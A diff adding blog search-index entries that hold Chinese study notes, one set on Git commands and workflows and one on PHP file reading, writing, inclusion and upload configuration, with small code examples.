+<li>名字：<strong><code>🔺命令：git config --global user.name &quot;tomas&quot;</code></strong></li>
+<li>邮箱：<strong><code>🔺命令：git config --global user.email &quot;643008933@qq.com&quot;</code></strong></li>
+<li>配置文件：~/.gitconfig（可设置代理，配置信息）</li>
+</ul>
+</li>
+<li>Git的基本命令<ul>
+<li>初始化：<strong><code>🔺命令：git init</code></strong></li>
+<li>仓库状态：<strong><code>🔺命令：git status</code></strong></li>
+<li>添加文件到暂存区管理：<strong><code>🔺命令：git add 文件名</code></strong><ul>
+<li>-A，所有文件</li>
+</ul>
+</li>
+<li>从暂存区删除文件：<strong><code>🔺命令：git rm --cacahe 文件名</code></strong></li>
+<li>查看文件：<strong><code>🔺命令：..git → cat index</code></strong></li>
+<li>提交：<strong><code>🔺命令：git commit -m &quot;文件名&quot;</code></strong><ul>
+<li>-m：描述提交的内容</li>
+</ul>
+</li>
+<li>建立连接：<strong><code>🔺命令：git remote add origin https://.....</code></strong></li>
+<li>查看远端信息：<strong><code>🔺命令：git remote -v</code></strong></li>
+<li>提交本地文件到远端服务器：<strong><code>🔺命令：git push origin master -u</code></strong><ul>
+<li>origin：远端仓库名称</li>
+<li>master：本地仓库名称</li>
+<li>-u：后续不需要输入名称</li>
+<li>:master ：删除远端的分支</li>
+<li>master:m1 ：更改远端分支名称为m1</li>
+</ul>
+</li>
+<li>克隆远程仓库到本地：<strong><code>🔺命令：git clone https://..... git-demo</code></strong><ul>
+<li>git-demo：为拉取到本地仓库的名称</li>
+</ul>
+</li>
+<li>拉取远端仓库修改数据到本地：<strong><code>🔺命令：git pull origin master</code></strong><ul>
+<li>origin：远端仓库名称</li>
+<li>master：本地仓库名称</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="Git-tutorial-Repository"><a href="#Git-tutorial-Repository" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
+<li>mkdir git-tutorial</li>
+<li>cd git-tutorial</li>
+<li>git init</li>
+<li>ll</li>
+<li>touch README.md</li>
+<li>git status</li>
+<li>git add README.md</li>
+<li>git status</li>
+<li>git rm –cacahe README.md</li>
+<li>git status</li>
+<li>git add README.md -A</li>
+<li>git status</li>
+<li>git commit -m “README.md”</li>
+<li>git remote add origin <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>..</li>
+<li>git remote -v</li>
+<li>git push origin master -u</li>
+<li>查看Github是否有新建一个仓库并有README.md</li>
+<li>cd ..</li>
+<li>git clone https://… git-demo</li>
+<li>vim README.md</li>
+<li>Hello world → wq</li>
+<li>git status</li>
+<li>git add README.md</li>
+<li>git commit -m “modify README.md”</li>
+<li>cd ..</li>
+<li>cd git-tutorial</li>
+<li>git pull origin master</li>
+<li>查看Github建立的仓库中的README.md是否有内容</li>
+</ul>
+<h3 id="0X02-Git的分支"><a href="#0X02-Git的分支" class="headerlink" title="0X02 Git的分支"></a>0X02 Git的分支</h3><ul>
+<li>版本发布、功能增加、错误修改</li>
+</ul>
+<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-1.PNG" alt="3-Git分支-1"></p>
+<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-2.PNG" alt="3-Git分支-2"></p>
+<ul>
+<li>分支发布合并</li>
+</ul>
+<p><img src="/images/git/3-Git%E5%88%86%E6%94%AF-3.PNG" alt="3-Git分支-3"></p>
+<h5 id="Git分支操作"><a href="#Git分支操作" class="headerlink" title="Git分支操作"></a>Git分支操作</h5><ul>
+<li>创建分支：<strong><code>🔺命令：git branch 分支名</code></strong><ul>
+<li>基于某个分支创建的分支，会复制其内容</li>
+</ul>
+</li>
+<li>查看分支：<strong><code>🔺命令：git branch</code></strong></li>
+<li>跳转分支：<strong><code>🔺命令：git checkout 分支名</code></strong>   </li>
+<li>创建分支并跳转：<strong><code>🔺命令：git checkout -b 分支名</code></strong></li>
+<li>删除分支：<strong><code>🔺命令：git branch -d 分支名</code></strong><ul>
+<li>▲ 无合并到master的分支无法删除，或者使用-D参数`**</li>
+</ul>
+</li>
+<li>合并分支：<strong><code>🔺命令：git merge 分支名</code></strong></li>
+</ul>
+<h5 id="Git-tutorial-Repository-1"><a href="#Git-tutorial-Repository-1" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
+<li>cd git-tutorial</li>
+<li>git branch feature1</li>
+<li>git branch</li>
+<li>git checkout feature1</li>
+<li>touch a.txt</li>
+<li>vim a.txt</li>
+<li>this is a.txt → wq</li>
+<li>git add a.txt</li>
+<li>git commit -m “a.txt”</li>
+<li>git branch feature2</li>
+<li>git checkout feature2</li>
+<li>git checkout -b feature3</li>
+<li>git branch</li>
+<li>git branch -d feature2</li>
+<li>touch b.txt</li>
+<li>vim b.txt</li>
+<li>this is b.txt → wq</li>
+<li>git add b.txt</li>
+<li>git commit -m “b.txt”</li>
+<li>git checkout master</li>
+<li>git branch -d feature3</li>
+<li>git merge feature3</li>
+<li>git push</li>
+<li>查看Github仓库是否有a.txt和b.txt，但无其他分支</li>
+<li>git branch feature1</li>
+<li>git push origin feature1</li>
+<li>查看Github仓库是否有feature1分支</li>
+<li>git push origin :feature1</li>
+<li>查看Github仓库是否无feature1分支</li>
+<li>git push origin feature1:f1</li>
+<li>查看Github仓库的feature1是否更改为f1</li>
+</ul>
+<h3 id="0X03-Git的合并"><a href="#0X03-Git的合并" class="headerlink" title="0X03 Git的合并"></a>0X03 Git的合并</h3><ul>
+<li>▲ 可以在Stackoverflow上看git log多样格式</li>
+<li>▲ rebase的黄金法则：绝对不要在公共分支使用rebase</li>
+<li>查看日志：git log<ul>
+<li>–oneline：一行的提交信息</li>
+<li>–oneline -3：只取前面3行</li>
+</ul>
+</li>
+<li>查看添加的内容：<strong><code>🔺命令：git show 哈希值</code></strong></li>
+<li>查看提交方式：<strong><code>🔺命令：git merge --help</code></strong><ul>
+<li>–ff（fast-forward）：默认不产生一次commit</li>
+<li>–no-ff：产生一个commit</li>
+</ul>
+</li>
+<li>移动分支，并将master分支的提交并入：<strong><code>🔺命令：git rebase</code></strong></li>
+<li>查看版本分支报错情况：<strong><code>🔺命令：git mergetool</code></strong><ul>
+<li>通过工具修改后，会生成一个x.txt.orig，保存冲突的现场</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>   merge和rebase<br>   merge：两个分支的修改提交，默认不提交，关注点在合并操作上<br>   rebase：将当前分支做的修改，复制在目标分支的最后一次中，关注点在开发的过程上 </p>
+</blockquote>
+<h5 id="Git-tutorial-Repository-2"><a href="#Git-tutorial-Repository-2" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
+<li>cd git-tutorial</li>
+<li>git branch -d f1</li>
+<li>git push origin :f1</li>
+<li>git log</li>
+<li>q</li>
+<li>git log –oneline</li>
+<li>git log –oneline -3</li>
+<li>git show d156c23</li>
+<li>vi ~/.config → dog = log –all –decorate –oneline –graph</li>
+<li>git dog</li>
+<li>git checkout -b f1</li>
+<li>touch fa.txt</li>
+<li>git add fa.txt</li>
+<li>git commit -m “add fa”</li>
+<li>git dog</li>
+<li>git checkout master</li>
+<li>git merge f1</li>
+<li>git dog</li>
+<li>git checkout f1</li>
+<li>touch fb.txt</li>
+<li>git commit -m “add fb”</li>
+<li>git checkout f1</li>
+<li>git merge f1 –no-ff</li>
+<li>git dog</li>
+<li>git push</li>
+<li>git push origin f1</li>
+<li>远程修改master中的a.txt</li>
+<li>git pull</li>
+<li>git checkout f1</li>
+<li>git merge master</li>
+<li>git dog</li>
+<li>git checkout master</li>
+<li>touch m1.txt</li>
+<li>git add m1.txt</li>
+<li>git commit -m “add m1”</li>
+<li>git checkout f1</li>
+<li>git dog</li>
+<li>git rebase</li>
+<li>git dog</li>
+<li>git checkout -b f2</li>
+<li>vim a.txt</li>
+<li>this is b.txt</li>
+<li>git add a.txt</li>
+<li>git commit -m “update a.txt”</li>
+<li>git checkout f1</li>
+<li>vi a.txt</li>
+<li>this is c.txt</li>
+<li>git add a.txt</li>
+<li>git commit -m “update c.txt”</li>
+<li>git checkout f2</li>
+<li>git merge f1</li>
+<li>cat a.txt</li>
+<li>git mergetool</li>
+<li>rm a.txt.orig</li>
+<li>git commit -m “update a.txt”</li>
+<li>git dog</li>
+</ul>
+<h3 id="0X04-Git的回滚撤销"><a href="#0X04-Git的回滚撤销" class="headerlink" title="0X04 Git的回滚撤销"></a>0X04 Git的回滚撤销</h3><ul>
+<li>返回前一次的记录：<strong><code>🔺命令：git reset master^/~5/hash值id</code></strong><ul>
+<li>^：每一个^符号标识[前一次]，如^^^表示回退三次</li>
+<li><del>：回退次数加在后面，如</del>5</li>
+<li>hash值id：回退到id号的版本</li>
+<li>–mix：把暂存区的文件丢弃，但不会动到工作目录的文件（默认方式）</li>
+<li>–soft：工作目录跟暂存区的文件都不会被丢弃</li>
+<li>–hard：不管是工作目录以及暂存区的文件都会丢弃</li>
+</ul>
+</li>
+<li>所有的日志文件：<strong><code>🔺命令：git reflog</code></strong></li>
+<li>撤销某次操作：<strong><code>🔺命令：git revert</code></strong><ul>
+<li>此次操作之前和之后的commit和history都会保留，并且把这次撤销作为一次最新的提交</li>
+</ul>
+</li>
+<li>▲ 在公用分支上应用revert，在私用分支上用reset</li>
+</ul>
+<blockquote>
+<pre><code>reset和revert
+revert：用一次新的commit来回滚之前的commit
+reset：只是将旧的commit指针移动，并无删除旧的commit</code></pre></blockquote>
+<h5 id="Git-tutorial-Repository-3"><a href="#Git-tutorial-Repository-3" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
+<li>cd git-tutorial</li>
+<li>touch hello.java</li>
+<li>git add hello.java</li>
+<li>git commit -m “hellp.java”</li>
+<li>git dog</li>
+<li>git reset master^</li>
+<li>git status</li>
+<li>ll</li>
+<li>git add hello.java</li>
+<li>git commit -m “add Hello.java”</li>
+<li>git dog</li>
+<li>git reset cd0309f</li>
+<li>git status</li>
+<li>git reset –hard 7d37397</li>
+<li>git status</li>
+<li>ll</li>
+<li>touch c.txt</li>
+<li>git add c.txt</li>
+<li>git commit -m “add c.txt”</li>
+<li>git dog</li>
+<li>git reset –soft 7d37397</li>
+<li>git status</li>
+<li>git reflog</li>
+<li>git reset –hard 00bd027</li>
+<li>ll</li>
+<li>git rest –hard HEAD</li>
+<li>git dog</li>
+<li>git revert</li>
+<li>git log</li>
+<li>git revert hash值id（Commit的ID）</li>
+<li>git dog</li>
+</ul>
+<h3 id="0X05-gitignore-fork同步"><a href="#0X05-gitignore-fork同步" class="headerlink" title="0X05 gitignore/fork同步"></a>0X05 gitignore/fork同步</h3><ul>
+<li>创建一个.gitignore文件，保存要忽略的内容<ul>
+<li>忽略系统生成的文件，如IDE的配置</li>
+<li>忽略编译生成的中间文件、可执行文件等</li>
+<li>忽略敏感的配置文件和本地不想提交的脚本</li>
+</ul>
+</li>
+<li>常用参数<ul>
+<li>配置文件：.settings/</li>
+<li>脚本文件：*.sh</li>
+<li>上次所有txt文件：!*.txt</li>
+<li>某个目录：/a/*.class</li>
+</ul>
+</li>
+<li>gitignore网站：<a href="https://www.gitignore.io" target="_blank" rel="noopener">https://www.gitignore.io</a></li>
+<li>查看远程的版本信息：<strong><code>🔺命令：git remote -v</code></strong></li>
+<li>增加一个远程仓库上传流：<strong><code>🔺命令：git remote add upstream https://...</code></strong></li>
+<li>更新远程仓库的版本：<strong><code>🔺命令：git fetch upstream 分支名</code></strong><ul>
+<li>分支名默认省略，则为master分支</li>
+<li>▲ pull = fetch + merge</li>
+</ul>
+</li>
+<li>查看远程原始仓库的分支：<strong><code>🔺命令：git branch -r</code></strong></li>
+</ul>
+<h5 id="Git-tutorial-Repository-4"><a href="#Git-tutorial-Repository-4" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
+<li>cd git-tutorial</li>
+<li>git add -A .</li>
+<li>git commit -m “add gitignore”</li>
+<li>git push -f</li>
+<li>git clone https://……awesome</li>
+<li>cd awesome</li>
+<li>git remote -v</li>
+<li>git remote add upstream https://…</li>
+<li>git remote -v</li>
+<li>git fetch upstream </li>
+<li>git branch -r</li>
+<li>git rebase upstream/master<ul>
+<li>merge关注的是提交的历史，将两次操作合并，但无提交数据，rebase则足够</li>
+</ul>
+</li>
+<li>git push</li>
+<li>git log</li>
+</ul>
+<h3 id="0X06-Git的免密传送"><a href="#0X06-Git的免密传送" class="headerlink" title="0X06 Git的免密传送"></a>0X06 Git的免密传送</h3><h5 id="Git传输的协议"><a href="#Git传输的协议" class="headerlink" title="Git传输的协议"></a>Git传输的协议</h5><ul>
+<li>local协议</li>
+<li>HTTP(S)协议：需要输入账号密码</li>
+<li>SSH协议：不需要输入账号密码</li>
+<li>Git协议</li>
+<li><a href="https://help.github.com/en/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent" target="_blank" rel="noopener">Git免密推送</a></li>
+</ul>
+<h5 id="SSH协议登陆"><a href="#SSH协议登陆" class="headerlink" title="SSH协议登陆"></a>SSH协议登陆</h5><ul>
+<li>在个人界面的Settings处</li>
+<li>SSH and GPG keys</li>
+<li>generating SSH keys</li>
+<li>Generating a new SSH key and adding it to the ssh-agent</li>
+<li>Windows<ul>
+<li>ssh-keygen -t rsa -b 4096 -C “<a href="mailto:643008933@qq.com" target="_blank" rel="noopener">643008933@qq.com</a>“<ul>
+<li>Enter a file in which to save the key (/c/Users/you/.ssh/id_rsa):[Press enter]</li>
+<li>Enter passphrase (empty for no passphrase): [Type a passphrase]</li>
+<li>Enter same passphrase again: [Type passphrase again]</li>
+</ul>
+</li>
+<li>eval $(ssh-agent -s)</li>
+<li>ssh-add ~/.ssh/id_rsa</li>
+<li>cat ~/.ssh/id_rsa.public</li>
+<li>复制公钥到New SSH Key</li>
+</ul>
+</li>
+<li>git clone with SSH</li>
+<li>touch a.txt</li>
+<li>git add a.txt</li>
+<li>git commit -m “add a.txt”</li>
+<li>git push（看是否需要账号密码登陆）</li>
+<li>▲ 2020.04.14 使用SSH协议登陆<ul>
+<li>git remote -v：查看git clone方式，如果是origin <a href="https://github.com......开头就说明需要调整" target="_blank" rel="noopener">https://github.com......开头就说明需要调整</a></li>
+<li>git remote rm origin：移除原来的git源</li>
+<li>git remote add origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:xxx.git：添加新的git源头（地址修改为要调整的）</li>
+<li>git remote -v：再查看git方式，如果是origin <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>….就开头就说明OK了，重新commit或者push就不用每次都输入账号密码了</li>
+</ul>
+</li>
+</ul>
+<h3 id="0X07-Git的工作流"><a href="#0X07-Git的工作流" class="headerlink" title="0X07 Git的工作流"></a>0X07 Git的工作流</h3><ul>
+<li><a href="https://github.com/xirong/my-git/blob/master/git-workflow-tutorial.md" target="_blank" rel="noopener">Git工作流指南</a></li>
+<li>集中式工作流</li>
+<li>功能分支工作流</li>
+<li>Gitflow工作流</li>
+<li>Forking工作流</li>
+</ul>
+<h3 id="0X08-常用工具"><a href="#0X08-常用工具" class="headerlink" title="0X08 常用工具"></a>0X08 常用工具</h3><ul>
+<li>sourcetree</li>
+<li>vscode</li>
+<li>git图标：<a href="https://gitmoji.surge.sh" target="_blank" rel="noopener">https://gitmoji.surge.sh</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>Git</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>php文件相关操作</title>
+    <url>/2020/07/12/php_file_about/</url>
+    <content><![CDATA[<hr>
+<h2 id="php文件相关操作"><a href="#php文件相关操作" class="headerlink" title="php文件相关操作"></a>php文件相关操作</h2><ul>
+<li>文件操作</li>
+<li>文件包含<ul>
+<li>文件包含形式</li>
+<li>区别</li>
+<li>文件加载原理</li>
+<li>文件加载路径</li>
+<li>文件嵌套包含</li>
+</ul>
+</li>
+<li>文件上传<ul>
+<li>配置php.ini</li>
+<li>新建一个文件上传</li>
+</ul>
+</li>
+</ul>
+<h3 id="0X00-文件操作"><a href="#0X00-文件操作" class="headerlink" title="0X00 文件操作"></a>0X00 文件操作</h3><ul>
+<li>fopen() 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。<ul>
+<li>$myfile = fopen(“webdictionary.txt”, “r”) or die(“Unable to open file!”);</li>
+</ul>
+</li>
+<li>读文件<ul>
+<li>Fgets($find) //读第一行文件<ul>
+<li>▲ 文件指针必须是有效的，必须指向由 fopen()或fsockopen()成功打开的文件(并还未由 fclose() 关闭)。</li>
+<li>▲ fget()可以被用来模拟get/post请求，结合fopen()和fsockopen()两个函数</li>
+</ul>
+</li>
+<li>Fread($find,获取字节) //指定获取内容</li>
+<li>Filesize($find) //获取文件字节<ul>
+<li>▲ $find 必须为路径</li>
+</ul>
+</li>
+<li>Fclose($find) //关闭资源</li>
+</ul>
+</li>
+<li>修改或添加文件内容<ul>
+<li>Fopen(./1.xx,”a+”);</li>
+<li>Fwrite(“文件”,”内容”);<ul>
+<li>▲ 只能将字符串string写进文件，无法将数组写进</li>
+<li>▲ 写进数组可借用file_put_contents()函数</li>
+</ul>
+</li>
+<li>Fclose(find);  //关闭资源</li>
+</ul>
+</li>
+<li>文件指针feof()<ul>
+<li>▲ 文件指针必须是有效的，必须指向由 fopen()或fsockopen()成功打开的文件（并还未由 fclose()关闭）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //读文件</span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">    echo Fgets($f);  //读第一行文件</span><br><span class="line">    echo Fgets($f);  //读第二行文件</span><br><span class="line">    echo Fread($f,2);  //获取文件前两个字符</span><br><span class="line"></span><br><span class="line">    echo Filesize($f);  //获取屋内按总的字符数</span><br><span class="line">    echo Fread($f,Filesize(&apos;./1.html&apos;));  //输出1.html中的所有内容</span><br><span class="line"></span><br><span class="line">    Fclose($f);  //关闭文件</span><br><span class="line">    echo Fread($f,2);  //无法读取到文件</span><br><span class="line"></span><br><span class="line">    //读写文件</span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;a+&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa&apos;)  //在文件最后添加aaaaaa</span><br><span class="line">    Fclose($f);</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa&apos;)  //删除文件，并在文件开头添加aaaaaa</span><br><span class="line">    Fclose($f);</span><br><span class="line"></span><br><span class="line">    //路径拼接</span><br><span class="line"></span><br><span class="line">    $lujing = $_SERVER[&apos;DOCUMENT_ROOT&apos;].&quot;/&quot;;</span><br><span class="line"></span><br><span class="line">    $f = fopen($lujing.&quot;123.txt&quot;,&quot;a.txt&quot;);</span><br><span class="line"></span><br><span class="line">    Fwrite($f,&apos;aaaaaa\r\n&apos;);  //写入成功</span><br><span class="line"></span><br><span class="line">    //命令读取文件</span><br><span class="line"></span><br><span class="line">    echo `dir`;  //读取系统路径</span><br><span class="line"></span><br><span class="line">    echo `type d:\\1.txt`;  //读取1.txt文件中的内容</span><br><span class="line"></span><br><span class="line">    //文件指针</span><br><span class="line"></span><br><span class="line">    $f = fopen(&quot;./1.txt&quot;, &quot;r+&quot;);</span><br><span class="line">    while(!feof($f))</span><br><span class="line">    &#123;</span><br><span class="line">        $result.= fgets($f,128);</span><br><span class="line">    &#125;</span><br><span class="line">    echo $result;  //输出1.txt的所有内容</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0X01-文件包含"><a href="#0X01-文件包含" class="headerlink" title="0X01 文件包含"></a>0X01 文件包含</h3><h5 id="文件包含形式"><a href="#文件包含形式" class="headerlink" title="文件包含形式"></a>文件包含形式</h5><ul>
+<li>四种文件包含形式<ul>
+<li>Include：包含文件</li>
+<li>Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）</li>
+<li>Require：与include相同</li>
+<li>Require_once：以include_once相同</li>
+</ul>
+</li>
+<li>向上包含<ul>
+<li>先包含文件，后使用文件中的内容  </li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include1.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //被包含文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //定义数据</span><br><span class="line">    $a = 1;</span><br><span class="line">    define(&apos;PI&apos;,3.14);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include2.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //包含文件：使用数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件</span><br><span class="line">    include &apos;include1.php&apos;; //包含当前文件include2.php所在文件夹下的include1.php</span><br><span class="line"></span><br><span class="line">    echo $a,PI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //再次加载</span><br><span class="line">    //include &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    //include_once</span><br><span class="line">    //include_once &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>向下包含<ul>
+<li>先准备内容，然后包含另外的文件，在另外的文件中，使用当前的内容</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include3.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //定义数据</span><br><span class="line"></span><br><span class="line">    $a = 10;</span><br><span class="line">    const PI = 3.14;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件：为了显示以上数据</span><br><span class="line">    include_once &apos;include4.php&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include4.php</span><br><span class="line">&lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;&lt;?php echo $a;?&gt;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;?php echo PI;?&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><ul>
+<li>Include和include_once<ul>
+<li>Include系统会碰到一次，执行一次；如果对统一个文件进行多次加载，那么系统会执行多次；</li>
+<li>Include_once：系统碰到多次，也只会执行一次。</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include2.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //包含文件：使用数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //包含文件</span><br><span class="line">    include &apos;include1.php&apos;; //包含当前文件include2.php所在文件夹下的include1.php</span><br><span class="line"></span><br><span class="line">    echo $a,PI;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //再次加载</span><br><span class="line">    //include &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    //include_once</span><br><span class="line">    //include_once &apos;include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Require和include<ul>
+<li>本质都是包含文件，唯一的区别在于包含不到文件的时候，报错的形式不一样</li>
+<li>Include的错误级别比较轻：不会阻止代码执行</li>
+<li>Require要求较高：如果包含出错代码不再执行（require后面的代码）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include5.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //require和include的区别</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //include包含文件</span><br><span class="line">    //include &apos;a.php&apos;;</span><br><span class="line"></span><br><span class="line">    //require包含文件</span><br><span class="line">    require &apos;a.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo &apos;hello world&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="文件加载原理"><a href="#文件加载原理" class="headerlink" title="文件加载原理"></a>文件加载原理</h5><ul>
+<li>PHP代码的执行流程<ul>
+<li>读取代码文件（PHP程序）</li>
+<li>编译：将PHP代码转换成字节码（生成opcode）</li>
+<li>zendengine来解析opcode，按照字节码去进行逻辑运算</li>
+<li>转换成对应的HTML代码</li>
+</ul>
+</li>
+<li>文件加载原理<ul>
+<li>在文件加载（include或者require）的时候，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</li>
+<li>加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</li>
+<li>在PHP中被包含的文件是单独进行编译的</li>
+</ul>
+</li>
+<li>▲ PHP文件在编译的过程中如果出现了语法错误，那么会失败（不会执行）；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错</li>
+</ul>
+<h5 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h5><ul>
+<li>文件在加载的时候需要指定文件路径才能保证PHP正确的找到对应的文件</li>
+<li>绝对路径：从磁盘的根目录开始（本地绝对路径）<ul>
+<li>Windows：盘符C:/路径/PHP文件</li>
+<li>Linux：/路径/PHP文件</li>
+</ul>
+</li>
+<li>相对路径：从当前文件所在目录开始的路径<ul>
+<li>.|./：表示当前文件夹</li>
+<li>../：上级目录（当前文件夹的上一层文件夹）</li>
+</ul>
+</li>
+<li>效率对比<ul>
+<li>绝对路径相对效率偏低，但是相对安全（路径不会出问题）</li>
+<li>相对路径相对效率高些，但是容易出错（相对路径会发生改变）</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //PHP文件加载路径</span><br><span class="line"></span><br><span class="line">    //相对路径加载</span><br><span class="line">    //include_once &apos;include1.php&apos;;  //默认当前文件本身</span><br><span class="line"></span><br><span class="line">    //include_once &apos;./include1.php&apos;;    </span><br><span class="line"></span><br><span class="line">    //复杂相对路径</span><br><span class="line">    //include_once &apos;../htdocs/include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //绝对路径</span><br><span class="line">    include_once &apos;D:/server/Apache24/htdocs/include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    echo $a;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="文件嵌套包含"><a href="#文件嵌套包含" class="headerlink" title="文件嵌套包含"></a>文件嵌套包含</h5><ul>
+<li>一个文件包含另外一个文件，同时被包含的文件又包含了另外一个文件</li>
+</ul>
+<h3 id="0X02-文件上传"><a href="#0X02-文件上传" class="headerlink" title="0X02 文件上传"></a>0X02 文件上传</h3><ul>
+<li>表单的enctype属性规定在发送到服务器之前应该如何对表单数据进行编码<ul>
+<li>application/x-www-form-urlencoded -&gt; 在发送前编码所有字符（默认）</li>
+<li>multipart/form-data -&gt; 不对字符编码，在使用包含文件上传控件的表单时，必须使用该值</li>
+<li>text/plain  -&gt; 空格转为”+”加号，但不对特殊字符编码</li>
+</ul>
+</li>
+</ul>
+<h5 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h5><ul>
+<li>file_upload = on  //是否允许文件上传，默认开启，即允许上传文件</li>
+<li>upload_tmp_dir =   //文件上传到服务器后产生的临时文件路径，如果没有指定临时文件路径，那么使用系统的临时目录，一般会修改配置文件，指定临时目录</li>
+<li>upload_max_filesize = 2M  //允许上传的单个文件的最大值</li>
+<li>max_file_uploads = 20  //一次上传文件允许的最大数目</li>
+</ul>
+<h5 id="新建一个文件上传"><a href="#新建一个文件上传" class="headerlink" title="新建一个文件上传"></a>新建一个文件上传</h5><ul>
+<li>1.html</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form actiion=&quot;&quot; method=&quot;post&quot; enctype=&quot;,ultipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    上传:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>demo.php</li>
+</ul>
